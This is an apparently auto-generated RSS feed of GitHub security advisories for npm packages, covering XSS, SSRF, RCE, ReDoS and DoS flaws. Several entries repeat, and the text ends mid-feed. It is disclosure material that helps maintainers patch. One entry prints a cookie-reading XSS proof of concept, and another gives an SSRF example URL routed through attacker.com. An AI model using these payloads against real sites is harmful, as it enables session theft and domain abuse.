<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2025-06-18T15:36:39.357Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[@openlist-frontend/openlist-frontend] OpenList (frontend) allows XSS Attacks in the built-in Markdown Viewer]]></title>
        <id>https://github.com/advisories/GHSA-2hw3-h8qx-hqqp</id>
        <link href="https://github.com/advisories/GHSA-2hw3-h8qx-hqqp"/>
        <updated>2025-06-18T14:41:29.000Z</updated>
        <content type="html"><![CDATA[<p>XSS via <code>.py</code> file containing script tag interpreted as HTML</p>
<h2 id="summary">Summary</h2>
<p>A vulnerability exists in the file preview/browsing feature of the application, where files with a <code>.py</code> extension that contain JavaScript code wrapped in <code>&lt;script&gt;</code> tags may be interpreted and executed as HTML in certain modes. This leads to a stored XSS vulnerability.</p>
<h2 id="affected-versions">Affected Versions</h2>
<ul>
<li>&lt;= 4.0.0-rc.3</li>
</ul>
<h2 id="poc">PoC</h2>
<p>Create a <code>.py</code> file with arbitrary JavaScript content wrapped in <code>&lt;script&gt;</code> tags. For example:</p>
<pre><code class="language-javascript">&lt;script&gt;alert(document.cookie);&lt;/script&gt;
</code></pre>
<p>When a victim views the file in browsing mode (e.g., a rendered preview), the JavaScript is executed in the browser context.</p>
<hr>
<h2 id="attack-vector">Attack vector</h2>
<p>An attacker can place such a <code>.py</code> file in the system via remote channels, such as:</p>
<ul>
<li>Convincing a webmaster to download or upload the file; </li>
<li>Tricking users into accessing a file link via public URLs.</li>
</ul>
<h2 id="required-permissions">Required permissions</h2>
<ul>
<li>None, if public or visitor access is enabled.</li>
<li>If the file is uploaded by a user with elevated permissions, potential privilege boundaries may be crossed.</li>
</ul>
<h2 id="user-interaction">User interaction</h2>
<p>Yes. The user must manually click to switch to the browsing or preview mode to trigger the script. And seems only when using <code>ISO-8859-1</code> encoding.</p>
<h2 id="scope">Scope</h2>
<ul>
<li>Unchanged <code>(S:U)</code> - The attack does not cross system or privilege boundaries in general.</li>
<li>⚠️ Controversial edge case: If sensitive preview files are accessible due to misconfiguration, scope could be considered Changed <code>(S:C)</code>.</li>
</ul>
<h2 id="impact">Impact</h2>
<ul>
<li>Confidentiality: User information including cookies, login state, and localStorage may be accessed. Some files that only can be viewed via this user will leak too.</li>
<li>Integrity &amp; Availability: Not directly impacted.</li>
</ul>
<hr>
<h2 id="recommendations">Recommendations</h2>
<ul>
<li>Treat all previewed file types (including non-HTML like .py) as plain text unless explicitly sanitized.</li>
<li>Disable rendering modes that can interpret user-uploaded content as HTML.</li>
</ul>
<h2 id="timeline">Timeline</h2>
<table>
<thead>
<tr>
<th>Date</th>
<th>Event</th>
</tr>
</thead>
<tbody><tr>
<td>2025-06-17</td>
<td>Vulnerability reported</td>
</tr>
<tr>
<td>2025-06-17</td>
<td>Comminuty Manager confirmed</td>
</tr>
<tr>
<td>2025-06-17</td>
<td>Fixed</td>
</tr>
</tbody></table>
<h1 id="credits">Credits</h1>
<ul>
<li>Discovered by: @zyk2507</li>
<li>Reported to: <a href="https://github.com/OpenListTeam">The OpenList Team</a></li>
<li>Analyzed and confirmed by: @jyxjjj</li>
<li>Fixed by: @cxw620</li>
<li>Fixed in: <code>4.0.0-rc.4</code></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OpenListTeam/OpenList/security/advisories/GHSA-2hw3-h8qx-hqqp">https://github.com/OpenListTeam/OpenList/security/advisories/GHSA-2hw3-h8qx-hqqp</a></li>
<li><a href="https://github.com/OpenListTeam/OpenList-Frontend/commit/7b5ed20c608c7b9b36d1950a386678e0a89f8175">https://github.com/OpenListTeam/OpenList-Frontend/commit/7b5ed20c608c7b9b36d1950a386678e0a89f8175</a></li>
<li><a href="https://github.com/advisories/GHSA-2hw3-h8qx-hqqp">https://github.com/advisories/GHSA-2hw3-h8qx-hqqp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2hw3-h8qx-hqqp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-18T14:41:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[microlight] microlight allows a denial of service]]></title>
        <id>https://github.com/advisories/GHSA-wgc6-9f6w-h8hx</id>
        <link href="https://github.com/advisories/GHSA-wgc6-9f6w-h8hx"/>
        <updated>2025-06-17T22:36:41.000Z</updated>
        <content type="html"><![CDATA[<p>A denial of service (DoS) vulnerability has been identified in the JavaScript library microlight version 0.0.7. This library, used for syntax highlighting, does not limit the size of textual content it processes in HTML elements with the microlight class. When excessively large content (e.g., 100 million characters) is processed, the reset function in microlight.js consumes excessive memory and CPU resources, causing browser crashes or unresponsiveness. An attacker can exploit this vulnerability by tricking a user into visiting a malicious web page containing a microlight element with large content, resulting in a denial of service.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-45526">https://nvd.nist.gov/vuln/detail/CVE-2025-45526</a></li>
<li><a href="https://gist.github.com/Rootingg/483b09b760d031b62b172f2153f3ed2a">https://gist.github.com/Rootingg/483b09b760d031b62b172f2153f3ed2a</a></li>
<li><a href="https://github.com/advisories/GHSA-wgc6-9f6w-h8hx">https://github.com/advisories/GHSA-wgc6-9f6w-h8hx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wgc6-9f6w-h8hx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-17T21:32:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[microlight] microlight.js has a null pointer dereference vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-64x7-m7rh-9m83</id>
        <link href="https://github.com/advisories/GHSA-64x7-m7rh-9m83"/>
        <updated>2025-06-17T22:36:32.000Z</updated>
        <content type="html"><![CDATA[<p>A null pointer dereference vulnerability was discovered in microlight.js (version 0.0.7), a lightweight syntax highlighting library. When processing elements with non-standard CSS color values, the library fails to validate the result of a regular expression match before accessing its properties, leading to an uncaught TypeError and potential application crash.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-45525">https://nvd.nist.gov/vuln/detail/CVE-2025-45525</a></li>
<li><a href="https://gist.github.com/Rootingg/843368931f70886bed3cf982f10a4424">https://gist.github.com/Rootingg/843368931f70886bed3cf982f10a4424</a></li>
<li><a href="https://github.com/advisories/GHSA-64x7-m7rh-9m83">https://github.com/advisories/GHSA-64x7-m7rh-9m83</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-64x7-m7rh-9m83</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-17T21:32:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@opennextjs/cloudflare] OpenNext for Cloudflare (opennextjs-cloudflare) has a SSRF vulnerability via /_next/image endpoint]]></title>
        <id>https://github.com/advisories/GHSA-rvpw-p7vw-wj3m</id>
        <link href="https://github.com/advisories/GHSA-rvpw-p7vw-wj3m"/>
        <updated>2025-06-16T21:46:53.000Z</updated>
        <content type="html"><![CDATA[<p>A Server-Side Request Forgery (SSRF) vulnerability was identified in the @opennextjs/cloudflare package. </p>
<p>The vulnerability stems from an unimplemented feature in the Cloudflare adapter for Open Next, which allowed unauthenticated users to proxy arbitrary remote content via the <code>/_next/image</code> endpoint. </p>
<p>This issue allowed attackers to load remote resources from arbitrary hosts under the victim site’s domain for any site deployed using the Cloudflare adapter for Open Next.  For example: <code>https://victim-site.com/_next/image?url=https://attacker.com</code>. In this example, attacker-controlled content from attacker.com is served through the victim site’s domain (<code>victim-site.com</code>), violating the same-origin policy and potentially misleading users or other services.</p>
<h3 id="impact">Impact</h3>
<ul>
<li>SSRF via unrestricted remote URL loading </li>
<li>Arbitrary remote content loading </li>
<li>Potential internal service exposure or phishing risks through domain abuse</li>
</ul>
<h3 id="mitigation">Mitigation</h3>
<p>The following mitigations have been put in place: </p>
<p><strong>Server side updates</strong> to Cloudflare’s platform to restrict the content loaded via the <code>/_next/image</code> endpoint to images. The update automatically mitigates the issue for all existing and any future sites deployed to Cloudflare using the affected version of the Cloudflare adapter for Open Next </p>
<p><strong>Root cause fix</strong>: Pull request <a href="https://github.com/opennextjs/opennextjs-cloudflare/pull/727">https://github.com/opennextjs/opennextjs-cloudflare/pull/727</a>  to the Cloudflare adapter for Open Next. The patched version of the adapter is found here  <a href="https://www.npmjs.com/package/@opennextjs/cloudflare/v/1.3.0">@opennextjs/cloudflare@1.3.0</a></p>
<p><strong>Package dependency update</strong>: Pull request <a href="https://github.com/cloudflare/workers-sdk/pull/9608">https://github.com/cloudflare/workers-sdk/pull/9608</a>  to create-cloudflare (c3) to use the fixed version of the Cloudflare adapter for Open Next. The patched version of create-cloudflare is found at <a href="https://www.npmjs.com/package/create-cloudflare/v/2.49.3">create-cloudflare@2.49.3</a>.</p>
<p> In addition to the automatic mitigation deployed on Cloudflare’s platform, we encourage affected users to upgrade to @opennext/cloudflare v1.3.0 and use the <a href="https://nextjs.org/docs/pages/api-reference/components/image#remotepatterns">remotePatterns</a> filter in Next config if they need to allow-list external urls with images assets.</p>
<h3 id="credits">Credits</h3>
<p>Disclosed responsibly by security researcher Edward Coristine. Thank you for the report.</p>
<h3 id="references">References</h3>
<p><a href="https://www.cve.org/cverecord?id=CVE-2025-6087">https://www.cve.org/cverecord?id=CVE-2025-6087</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/opennextjs/opennextjs-cloudflare/security/advisories/GHSA-rvpw-p7vw-wj3m">https://github.com/opennextjs/opennextjs-cloudflare/security/advisories/GHSA-rvpw-p7vw-wj3m</a></li>
<li><a href="https://github.com/cloudflare/workers-sdk/pull/9608">https://github.com/cloudflare/workers-sdk/pull/9608</a></li>
<li><a href="https://github.com/opennextjs/opennextjs-cloudflare/pull/727">https://github.com/opennextjs/opennextjs-cloudflare/pull/727</a></li>
<li><a href="https://github.com/opennextjs/opennextjs-cloudflare/commit/36119c0f490c95b3d4f6e826d745b728c80625ab">https://github.com/opennextjs/opennextjs-cloudflare/commit/36119c0f490c95b3d4f6e826d745b728c80625ab</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-6087">https://nvd.nist.gov/vuln/detail/CVE-2025-6087</a></li>
<li><a href="https://github.com/opennextjs/opennextjs-cloudflare">https://github.com/opennextjs/opennextjs-cloudflare</a></li>
<li><a href="https://github.com/advisories/GHSA-rvpw-p7vw-wj3m">https://github.com/advisories/GHSA-rvpw-p7vw-wj3m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rvpw-p7vw-wj3m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-16T19:37:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@modelcontextprotocol/inspector] MCP Inspector proxy server lacks authentication between the Inspector client and proxy]]></title>
        <id>https://github.com/advisories/GHSA-7f8r-222p-6f5g</id>
        <link href="https://github.com/advisories/GHSA-7f8r-222p-6f5g"/>
        <updated>2025-06-13T22:15:27.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of MCP Inspector below 0.14.1 are vulnerable to remote code execution due to lack of authentication between the Inspector client and proxy, allowing unauthenticated requests to launch MCP commands over stdio. Users should immediately upgrade to version 0.14.1 or later to address these vulnerabilities.</p>
<p>Credit: Rémy Marot <a href="mailto:bughunters@tenable.com">bughunters@tenable.com</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/modelcontextprotocol/inspector/security/advisories/GHSA-7f8r-222p-6f5g">https://github.com/modelcontextprotocol/inspector/security/advisories/GHSA-7f8r-222p-6f5g</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-49596">https://nvd.nist.gov/vuln/detail/CVE-2025-49596</a></li>
<li><a href="https://github.com/modelcontextprotocol/inspector/commit/50df0e1ec488f3983740b4d28d2a968f12eb8979">https://github.com/modelcontextprotocol/inspector/commit/50df0e1ec488f3983740b4d28d2a968f12eb8979</a></li>
<li><a href="https://github.com/advisories/GHSA-7f8r-222p-6f5g">https://github.com/advisories/GHSA-7f8r-222p-6f5g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7f8r-222p-6f5g</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-06-13T22:15:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[next] Information exposure in Next.js dev server due to lack of origin verification]]></title>
        <id>https://github.com/advisories/GHSA-3h52-269p-cp9r</id>
        <link href="https://github.com/advisories/GHSA-3h52-269p-cp9r"/>
        <updated>2025-06-13T14:41:22.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A low-severity vulnerability in <strong>Next.js</strong> has been fixed in <strong>version 15.2.2</strong>. This issue may have allowed limited source code exposure when the dev server was running with the App Router enabled. The vulnerability only affects local development environments and requires the user to visit a malicious webpage while <code>npm run dev</code> is active.</p>
<p>Because the mitigation is potentially a breaking change for some development setups, to opt-in to the fix, you must configure <code>allowedDevOrigins</code> in your next config after upgrading to a patched version. <a href="https://nextjs.org/docs/app/api-reference/config/next-config-js/allowedDevOrigins">Learn more</a>.</p>
<p>Learn more: <a href="https://vercel.com/changelog/cve-2025-48068">https://vercel.com/changelog/cve-2025-48068</a></p>
<h2 id="credit">Credit</h2>
<p>Thanks to <a href="https://github.com/sapphi-red">sapphi-red</a> and <a href="https://github.com/R4356th">Radman Siddiki</a> for responsibly disclosing this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vercel/next.js/security/advisories/GHSA-3h52-269p-cp9r">https://github.com/vercel/next.js/security/advisories/GHSA-3h52-269p-cp9r</a></li>
<li><a href="https://vercel.com/changelog/cve-2025-48068">https://vercel.com/changelog/cve-2025-48068</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48068">https://nvd.nist.gov/vuln/detail/CVE-2025-48068</a></li>
<li><a href="https://github.com/advisories/GHSA-3h52-269p-cp9r">https://github.com/advisories/GHSA-3h52-269p-cp9r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3h52-269p-cp9r</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-05-28T21:52:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[next] Information exposure in Next.js dev server due to lack of origin verification]]></title>
        <id>https://github.com/advisories/GHSA-3h52-269p-cp9r</id>
        <link href="https://github.com/advisories/GHSA-3h52-269p-cp9r"/>
        <updated>2025-06-13T14:41:22.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A low-severity vulnerability in <strong>Next.js</strong> has been fixed in <strong>version 15.2.2</strong>. This issue may have allowed limited source code exposure when the dev server was running with the App Router enabled. The vulnerability only affects local development environments and requires the user to visit a malicious webpage while <code>npm run dev</code> is active.</p>
<p>Because the mitigation is potentially a breaking change for some development setups, to opt-in to the fix, you must configure <code>allowedDevOrigins</code> in your next config after upgrading to a patched version. <a href="https://nextjs.org/docs/app/api-reference/config/next-config-js/allowedDevOrigins">Learn more</a>.</p>
<p>Learn more: <a href="https://vercel.com/changelog/cve-2025-48068">https://vercel.com/changelog/cve-2025-48068</a></p>
<h2 id="credit">Credit</h2>
<p>Thanks to <a href="https://github.com/sapphi-red">sapphi-red</a> and <a href="https://github.com/R4356th">Radman Siddiki</a> for responsibly disclosing this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vercel/next.js/security/advisories/GHSA-3h52-269p-cp9r">https://github.com/vercel/next.js/security/advisories/GHSA-3h52-269p-cp9r</a></li>
<li><a href="https://vercel.com/changelog/cve-2025-48068">https://vercel.com/changelog/cve-2025-48068</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48068">https://nvd.nist.gov/vuln/detail/CVE-2025-48068</a></li>
<li><a href="https://github.com/advisories/GHSA-3h52-269p-cp9r">https://github.com/advisories/GHSA-3h52-269p-cp9r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3h52-269p-cp9r</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-05-28T21:52:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[brace-expansion] brace-expansion Regular Expression Denial of Service vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-v6h2-p8h4-qcjw</id>
        <link href="https://github.com/advisories/GHSA-v6h2-p8h4-qcjw"/>
        <updated>2025-06-11T21:00:29.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is <code>a5b98a4f30d7813266b221435e1eaaf25a1b0ac5</code>. It is recommended to upgrade the affected component.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-5889">https://nvd.nist.gov/vuln/detail/CVE-2025-5889</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/pull/65/commits/a5b98a4f30d7813266b221435e1eaaf25a1b0ac5">https://github.com/juliangruber/brace-expansion/pull/65/commits/a5b98a4f30d7813266b221435e1eaaf25a1b0ac5</a></li>
<li><a href="https://gist.github.com/mmmsssttt404/37a40ce7d6e5ca604858fe30814d9466">https://gist.github.com/mmmsssttt404/37a40ce7d6e5ca604858fe30814d9466</a></li>
<li><a href="https://vuldb.com/?ctiid.311660">https://vuldb.com/?ctiid.311660</a></li>
<li><a href="https://vuldb.com/?id.311660">https://vuldb.com/?id.311660</a></li>
<li><a href="https://vuldb.com/?submit.585717">https://vuldb.com/?submit.585717</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/0b6a9781e18e9d2769bb2931f4856d1360243ed2">https://github.com/juliangruber/brace-expansion/commit/0b6a9781e18e9d2769bb2931f4856d1360243ed2</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/15f9b3c75ebf5988198241fecaebdc45eff28a9f">https://github.com/juliangruber/brace-expansion/commit/15f9b3c75ebf5988198241fecaebdc45eff28a9f</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/36603d5f3599a37af9e85eda30acd7d28599c36e">https://github.com/juliangruber/brace-expansion/commit/36603d5f3599a37af9e85eda30acd7d28599c36e</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/c3c73c8b088defc70851843be88ccc3af08e7217">https://github.com/juliangruber/brace-expansion/commit/c3c73c8b088defc70851843be88ccc3af08e7217</a></li>
<li><a href="https://github.com/advisories/GHSA-v6h2-p8h4-qcjw">https://github.com/advisories/GHSA-v6h2-p8h4-qcjw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v6h2-p8h4-qcjw</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-06-09T21:30:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[brace-expansion] brace-expansion Regular Expression Denial of Service vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-v6h2-p8h4-qcjw</id>
        <link href="https://github.com/advisories/GHSA-v6h2-p8h4-qcjw"/>
        <updated>2025-06-11T21:00:29.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is <code>a5b98a4f30d7813266b221435e1eaaf25a1b0ac5</code>. It is recommended to upgrade the affected component.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-5889">https://nvd.nist.gov/vuln/detail/CVE-2025-5889</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/pull/65/commits/a5b98a4f30d7813266b221435e1eaaf25a1b0ac5">https://github.com/juliangruber/brace-expansion/pull/65/commits/a5b98a4f30d7813266b221435e1eaaf25a1b0ac5</a></li>
<li><a href="https://gist.github.com/mmmsssttt404/37a40ce7d6e5ca604858fe30814d9466">https://gist.github.com/mmmsssttt404/37a40ce7d6e5ca604858fe30814d9466</a></li>
<li><a href="https://vuldb.com/?ctiid.311660">https://vuldb.com/?ctiid.311660</a></li>
<li><a href="https://vuldb.com/?id.311660">https://vuldb.com/?id.311660</a></li>
<li><a href="https://vuldb.com/?submit.585717">https://vuldb.com/?submit.585717</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/0b6a9781e18e9d2769bb2931f4856d1360243ed2">https://github.com/juliangruber/brace-expansion/commit/0b6a9781e18e9d2769bb2931f4856d1360243ed2</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/15f9b3c75ebf5988198241fecaebdc45eff28a9f">https://github.com/juliangruber/brace-expansion/commit/15f9b3c75ebf5988198241fecaebdc45eff28a9f</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/36603d5f3599a37af9e85eda30acd7d28599c36e">https://github.com/juliangruber/brace-expansion/commit/36603d5f3599a37af9e85eda30acd7d28599c36e</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/c3c73c8b088defc70851843be88ccc3af08e7217">https://github.com/juliangruber/brace-expansion/commit/c3c73c8b088defc70851843be88ccc3af08e7217</a></li>
<li><a href="https://github.com/advisories/GHSA-v6h2-p8h4-qcjw">https://github.com/advisories/GHSA-v6h2-p8h4-qcjw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v6h2-p8h4-qcjw</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-06-09T21:30:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[brace-expansion] brace-expansion Regular Expression Denial of Service vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-v6h2-p8h4-qcjw</id>
        <link href="https://github.com/advisories/GHSA-v6h2-p8h4-qcjw"/>
        <updated>2025-06-11T21:00:29.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is <code>a5b98a4f30d7813266b221435e1eaaf25a1b0ac5</code>. It is recommended to upgrade the affected component.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-5889">https://nvd.nist.gov/vuln/detail/CVE-2025-5889</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/pull/65/commits/a5b98a4f30d7813266b221435e1eaaf25a1b0ac5">https://github.com/juliangruber/brace-expansion/pull/65/commits/a5b98a4f30d7813266b221435e1eaaf25a1b0ac5</a></li>
<li><a href="https://gist.github.com/mmmsssttt404/37a40ce7d6e5ca604858fe30814d9466">https://gist.github.com/mmmsssttt404/37a40ce7d6e5ca604858fe30814d9466</a></li>
<li><a href="https://vuldb.com/?ctiid.311660">https://vuldb.com/?ctiid.311660</a></li>
<li><a href="https://vuldb.com/?id.311660">https://vuldb.com/?id.311660</a></li>
<li><a href="https://vuldb.com/?submit.585717">https://vuldb.com/?submit.585717</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/0b6a9781e18e9d2769bb2931f4856d1360243ed2">https://github.com/juliangruber/brace-expansion/commit/0b6a9781e18e9d2769bb2931f4856d1360243ed2</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/15f9b3c75ebf5988198241fecaebdc45eff28a9f">https://github.com/juliangruber/brace-expansion/commit/15f9b3c75ebf5988198241fecaebdc45eff28a9f</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/36603d5f3599a37af9e85eda30acd7d28599c36e">https://github.com/juliangruber/brace-expansion/commit/36603d5f3599a37af9e85eda30acd7d28599c36e</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/c3c73c8b088defc70851843be88ccc3af08e7217">https://github.com/juliangruber/brace-expansion/commit/c3c73c8b088defc70851843be88ccc3af08e7217</a></li>
<li><a href="https://github.com/advisories/GHSA-v6h2-p8h4-qcjw">https://github.com/advisories/GHSA-v6h2-p8h4-qcjw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v6h2-p8h4-qcjw</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-06-09T21:30:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[brace-expansion] brace-expansion Regular Expression Denial of Service vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-v6h2-p8h4-qcjw</id>
        <link href="https://github.com/advisories/GHSA-v6h2-p8h4-qcjw"/>
        <updated>2025-06-11T21:00:29.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is <code>a5b98a4f30d7813266b221435e1eaaf25a1b0ac5</code>. It is recommended to upgrade the affected component.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-5889">https://nvd.nist.gov/vuln/detail/CVE-2025-5889</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/pull/65/commits/a5b98a4f30d7813266b221435e1eaaf25a1b0ac5">https://github.com/juliangruber/brace-expansion/pull/65/commits/a5b98a4f30d7813266b221435e1eaaf25a1b0ac5</a></li>
<li><a href="https://gist.github.com/mmmsssttt404/37a40ce7d6e5ca604858fe30814d9466">https://gist.github.com/mmmsssttt404/37a40ce7d6e5ca604858fe30814d9466</a></li>
<li><a href="https://vuldb.com/?ctiid.311660">https://vuldb.com/?ctiid.311660</a></li>
<li><a href="https://vuldb.com/?id.311660">https://vuldb.com/?id.311660</a></li>
<li><a href="https://vuldb.com/?submit.585717">https://vuldb.com/?submit.585717</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/0b6a9781e18e9d2769bb2931f4856d1360243ed2">https://github.com/juliangruber/brace-expansion/commit/0b6a9781e18e9d2769bb2931f4856d1360243ed2</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/15f9b3c75ebf5988198241fecaebdc45eff28a9f">https://github.com/juliangruber/brace-expansion/commit/15f9b3c75ebf5988198241fecaebdc45eff28a9f</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/36603d5f3599a37af9e85eda30acd7d28599c36e">https://github.com/juliangruber/brace-expansion/commit/36603d5f3599a37af9e85eda30acd7d28599c36e</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/c3c73c8b088defc70851843be88ccc3af08e7217">https://github.com/juliangruber/brace-expansion/commit/c3c73c8b088defc70851843be88ccc3af08e7217</a></li>
<li><a href="https://github.com/advisories/GHSA-v6h2-p8h4-qcjw">https://github.com/advisories/GHSA-v6h2-p8h4-qcjw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v6h2-p8h4-qcjw</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-06-09T21:30:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pm2] pm2 Regular Expression Denial of Service vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-x5gf-qvw8-r2rm</id>
        <link href="https://github.com/advisories/GHSA-x5gf-qvw8-r2rm"/>
        <updated>2025-06-10T22:52:18.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability classified as problematic was found in Unitech pm2 up to 6.0.6. This vulnerability affects unknown code of the file /lib/tools/Config.js. The manipulation leads to inefficient regular expression complexity. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.</p>
